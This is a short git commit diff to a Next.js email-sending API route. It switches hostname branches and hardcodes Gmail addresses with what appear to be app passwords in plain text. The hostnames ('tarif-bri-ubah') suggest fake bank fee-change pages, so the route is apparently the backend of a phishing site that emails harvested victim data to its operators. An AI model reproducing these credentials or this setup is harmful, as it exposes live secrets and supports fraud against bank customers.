a42ceb833bac2c1a3834323291556db17b8ef9b1
penaruhangin <penaruhangin@gmail.com>
2022-10-07 23:30:08 +0700

    edit baru

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'tarif-ubah.herokuapp.com'){
+    } else if(url == 'tarif-bri-ubah.herokuapp.com'){
         email = 'andin1234zx@gmail.com' ;
         pass = 'qtqigmxdxvlcgdug' ;
 
